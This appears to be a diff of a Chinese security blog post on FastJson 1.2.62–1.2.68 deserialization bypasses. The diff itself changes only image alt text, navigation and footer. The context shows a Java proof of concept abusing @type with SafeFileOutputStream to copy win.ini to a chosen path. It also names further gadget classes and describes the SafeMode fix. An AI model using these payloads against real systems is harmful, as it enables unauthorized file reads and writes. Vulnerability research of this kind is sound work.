 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Fastjson</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">//        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\&quot;@type\&quot;:\&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream\&quot;,\&quot;tempPath\&quot;:\&quot;C://windows/win.ini\&quot;,\&quot;targetPath\&quot;:\&quot;E:/flag.txt\&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>可以看到成功读取文件内容并写入flag.txt</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742203598002-8b8b4abc-dd9c-433b-8689-da68f41ed4ae.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742203598002-8b8b4abc-dd9c-433b-8689-da68f41ed4ae.png" alt="FastJson 1.2.62-1.2.68反序列化漏洞" loading="lazy"></p>
 <h4 id="CdujD">写入文件</h4>
 利用类：com.esotericsoftware.kryo.io.Output
 
@@ -395,7 +416,7 @@ EXP如下，其实并没有什么差别，还是那句话，记得开启AutoType
 
 <p><a target="_blank" rel="noopener" href="https://github.com/alibaba/fastjson/compare/1.2.68%E2%80%A61.2.69#diff-f140f6d9ec704eccb9f4068af9d536981a644f7d2a6e06a1c50ab5ee078ef6b4">https://github.com/alibaba/fastjson/compare/1.2.68%E2%80%A61.2.69#diff-f140f6d9ec704eccb9f4068af9d536981a644f7d2a6e06a1c50ab5ee078ef6b4</a></p>
 <p>在expectClass的对比逻辑中，对类名进行了hash处理在比较hash黑名单，并添加了几个类</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742225722469-b1709e8b-66f9-4c87-ad97-444f38b9a26b.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742225722469-b1709e8b-66f9-4c87-ad97-444f38b9a26b.png" alt="FastJson 1.2.62-1.2.68反序列化漏洞" loading="lazy"></p>
 <p>有人通过彩虹表碰撞，知道了其中新添加的三个类为如下</p>
 <table>
 <thead>
@@ -434,7 +455,7 @@ EXP如下，其实并没有什么差别，还是那句话，记得开启AutoType
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setSafeMode(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure>
 
 <p>开启之后，就完全禁用<code>AutoType</code>即<code>@type</code>了，这样就能防御住Fastjson反序列化漏洞了。具体的处理逻辑，是放在<code>checkAutoType()</code>函数中的前面，获取是否设置了<code>SafeMode</code>，如果是则直接抛出异常终止运行</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742226095954-8dcd4d63-c233-44da-8255-69038f77625e.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742226095954-8dcd4d63-c233-44da-8255-69038f77625e.png" alt="FastJson 1.2.62-1.2.68反序列化漏洞" loading="lazy"></p>
 <h2 id="i8Gz2">其他一些绕过黑名单的Gadget</h2>
 <h3 id="Ez1g2">1.2.59</h3>
 com.zaxxer.hikari.HikariConfig类PoC：
@@ -482,13 +503,13 @@ org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory类PoC：
   <nav class="frame post-navigation" aria-label="相邻文章">
     
       <a href="/2025/03/25/Servlet%E5%86%85%E5%AD%98%E9%A9%AC/">
-        <span>← PREVIOUS</span>
+        <span>更新一篇</span>
         <strong>Servlet内存马</strong>
       </a>
     
     
-      <a href="/2025/03/24/FastJson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/">
-        <span>NEXT →</span>
+      <a class="post-navigation__older" href="/2025/03/24/FastJson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/">
+        <span>更早一篇</span>
         <strong>FastJson各版本绕过分析</strong>
       </a>
     
@@ -502,9 +523,9 @@ org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory类PoC：
       <a href="/">CURLYSEAN</a>
       <span>持续记录，保持验证。</span>
     </div>
-    <p class="site-footer__copyright">© 2026 CurlySean</p>
+    <p class="site-footer__copyright">© 2025–2026 CurlySean</p>
     <nav class="site-footer__links" aria-label="外部链接">
-      <a href="https://github.com/CurlySean" target="_blank" rel="noopener">GitHub ↗</a>
+      <a href="https://github.com/CurlySean" target="_blank" rel="noopener noreferrer">GitHub ↗</a>
       <a href="mailto:5345414e@gmail.com">Email ↗</a>
     </nav>
   </div>
